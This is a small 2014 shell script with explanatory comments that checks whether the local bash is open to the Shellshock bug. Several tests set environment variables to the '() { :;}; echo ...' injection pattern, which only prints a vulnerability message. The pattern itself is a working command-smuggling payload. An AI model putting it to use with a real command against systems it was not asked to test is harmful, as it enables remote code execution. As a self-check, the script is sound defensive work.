#!/bin/sh
# 2014-09-26 Robert Muil
#
#Exploring the recent shellshoch / bash bug.
#
# Essentially, the problem appears to be that when bash reads an environment
# variable, it actually executes any dangling code following a function definition.
# This occurs even when the environment variable is not later used.
# In other words, if bash is run, in any form, with an var in its environment
# that contains the malformed code, it will be exploited.
#
# - NB: doesn't seem to occur with a named function...
# - NB: typically /bin/sh is used, and if this doesn't point to bash, the system won't be vulnerable. On my fedora, for example, it is dash, not bash.
#
# ':' is a shell builtin which does nothing beyond expanding the arguments

echo "test0"

bash -c "echo test 0 finished"

dangerous_env='() { :;}; echo your bash is vulnerable'

echo "test 1"

bash -c "echo test 1 finished"

echo "test 1.5"
env bash -c "echo test 1.5 finished"

echo "test 2"
export dangerous_env
bash -c "echo test 2 finished"

echo "test 3"
env anyoldname='() { :;}; echo your bash is vulnerable with any env var name' bash -c "echo test 3 finished"

echo "test 4"
env blahblah='() { :;}; echo YOUR SYSTEM SHELL IS VULNERABLE!' sh -c "echo test 4 finished"

